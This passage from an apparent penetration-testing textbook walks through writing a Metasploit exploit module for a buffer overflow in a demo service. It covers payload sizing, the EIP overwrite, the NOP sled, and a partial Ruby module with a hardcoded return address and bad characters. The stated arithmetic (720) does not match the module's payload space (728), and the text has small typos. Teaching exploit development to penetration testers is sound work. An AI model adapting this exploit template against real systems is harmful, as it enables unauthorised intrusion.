as adding in a field telling Metasploit how larger the payload can be. We built our last payload so that the message we sent would always be 1024 characters, so we are going to stick with that. That means that the payload size is 1024 minus the sum of our overflow (268 bytes), the EIP overwrite (4 bytes), and the NOP sled (32 bytes).

When we are finished with these changes, we should have a module that looks like the following code. You can customize any of these variables if you like we put it in this chapter:

```
##
# This module requires Metasploit:
http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
## require 'msf/core'
class Metasploit4 < Msf::Exploit::Remote
Rank = NormalRanking
include Msf::Exploit::Remote::Tcp
def initialize(info = {})
super(update_info(info,
  'Name' => 'CFPT CH10 Buffer Overflow RCE',
  'Description' => 'Demo Coding for Pen Testersht need to know',
  'License' => 'MSF_LICENSE',
  'Author' => ['me@localhost'],
  'References' => [
    ['URL', 'http://www.amazon.com/Coding-Penetration-Testers-Building-Better/dp/1597497290/']
  ],
  'Platform' => 'linux',
  'Targets' => [
    ['Kali 2.0', { 'Ret' => 0xffffcc50 }]
  ],
  'Payload' => [
    'Space' => '728',
    'BadChars' => '\x00\x0a\x0d'
  ],
  'Privileged' => false

```